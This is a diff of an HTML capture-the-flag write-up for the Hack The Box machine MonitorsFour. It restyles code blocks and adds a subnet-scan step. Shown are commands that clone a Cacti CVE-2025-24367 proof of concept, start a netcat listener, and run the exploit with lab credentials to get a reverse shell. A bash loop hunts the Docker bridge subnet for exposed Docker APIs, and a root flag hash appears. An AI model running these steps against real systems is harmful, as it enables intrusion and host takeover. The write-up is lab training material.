@@ -225,24 +225,18 @@ The steps for the reverse shell process on the attacker machine were quite strai
 <hr>
 <h4 id="009-reverse-shell">009: Reverse Shell</h4>
 <p>Initially, the repo with the POC script was cloned.</p>
-<ul>
-<li><code>git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git</code></li>
-</ul>
-<p>Then as described, a Netcat server was running locally on the attacker.</p>
-<ul>
-<li><code>nc -lvnp 4444</code> | switches allow listening mode on the specified port, with no DNS resolution and verbose output</li>
-</ul>
-<p>A <code>venv</code> python virtual environment was created and activated, to enable <code>pip</code> installation of the POC required components.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
+</span></span></code></pre></div><p>Then as described, a Netcat server was running locally on the attacker.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span> | switches allow listening mode on the specified port, with no DNS resolution and verbose output
+</span></span></code></pre></div><p>A <code>venv</code> python virtual environment was created and activated, to enable <code>pip</code> installation of the POC required components.</p>
 <ul>
 <li><code>python3 -m venv venv</code></li>
 <li><code>source venv/bin/activate</code></li>
 <li><code>pip install requests beautifulsoup4</code></li>
 </ul>
 <p>Once the installation has completed, the appropriate parameters (relevant findings) were passed to the <code>exploit.py</code> for the correct execution which allowed reverse connection.</p>
-<ul>
-<li><code>python3 exploit.py -u marcus -p wonderful1 -i &lt;attacker_ip&gt; -l 4444 -url http://cacti.monitorsfour.htb</code></li>
-</ul>
-<p align="center">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit.py -u marcus -p wonderful1 -i &lt;attacker_ip&gt; -l <span style="color:#ae81ff">4444</span> -url http://cacti.monitorsfour.htb
+</span></span></code></pre></div><p align="center">
   <img src="/captures/screens/MonitorsFour/shot-011.png" alt="shot-011">
 </p>
 <hr>
@@ -276,20 +270,30 @@ Additional verification that the victim was a docker container was with the comm
   <img src="/captures/screens/MonitorsFour/shot-014.png" alt="shot-014">
 </p>
 <hr>
-<h4 id="013-docker-api">013: Docker API</h4>
+<h4 id="013-docker-reachability">013: Docker Reachability</h4>
 <p>As described the victim machine being Windows, it was assumed that the host was a Windows machine.
 
 <a href="https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai" target="_blank" rel="noopener">https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai</a>
  provided a brief guide towards accessing the Docker API through a container.
 <code>host.docker.internal</code> is a resolution which allows access to a host machine, specifically if it is Windows or macOS.
 A probe was made to <code>host.docker.internal</code> with the use of <code>curl</code>, and the name resolution resolved to <code>192.168.65.254</code> on <code>port 80</code>.
-Essentially, the command returned an output that described the container has access to the host&rsquo;s nginx server.</p>
-<ul>
-<li><code>curl -v http://host.docker.internal</code> | switch sets <code>curl</code> to verbose-mode</li>
-</ul>
-<p align="center">
+Essentially, the command returned an output that described the container has network access to the host&rsquo;s nginx server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -v http://host.docker.internal | switch sets <span style="color:#e6db74">`</span>curl<span style="color:#e6db74">`</span> to verbose-mode
+</span></span></code></pre></div><p align="center">
   <img src="/captures/screens/MonitorsFour/shot-015.png" alt="shot-015">
 </p>
+<hr>
+<h4 id="014-subnet-scan">014: Subnet Scan</h4>
+<p>Request to <code>host.docker.internal</code> resolved to an IP with the last octet <code>.254</code>, meaning it was the Docker bridge network gateway.
+Thus, the next step was a scan on the entire <code>/24</code> subnet for potential hosts that may expose Docker API.
+A simple Bash script has enabled a comprehensive subnet scan utilizing <code>curl</code>, and the host <code>192.168.65.7:2375</code> gave a response .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 254<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>curl -s --connect-timeout <span style="color:#ae81ff">1</span> http://192.168.65.$i:2375/version 2&gt;/dev/null | grep -q <span style="color:#e6db74">&#34;ApiVersion&#34;</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;192.168.65.</span>$i<span style="color:#e6db74">:2375&#34;</span> <span style="color:#f92672">&amp;&amp;</span> curl -v --connect-timeout <span style="color:#ae81ff">1</span> http://192.168.65.$i:2375/version 2&gt;/dev/null<span style="color:#f92672">)</span> &amp; <span style="color:#66d9ef">done</span>; wait
+</span></span></code></pre></div><ul>
+<li><code>loops through the 192.168.65.0/24 subnet and probes port 2375 on each host</code></li>
+<li><code>identifies exposed Docker APIs by checking for ApiVersion in the response</code></li>
+<li><code>prints and then verbosely queries any host that responds positively</code></li>
+<li><code>executes scans in parallel and waits for all probes to finish</code></li>
+</ul>
 <hr>
 <ul>
 <li>root: 35713cf72da6c0530e65ce8f42a16e26</li>
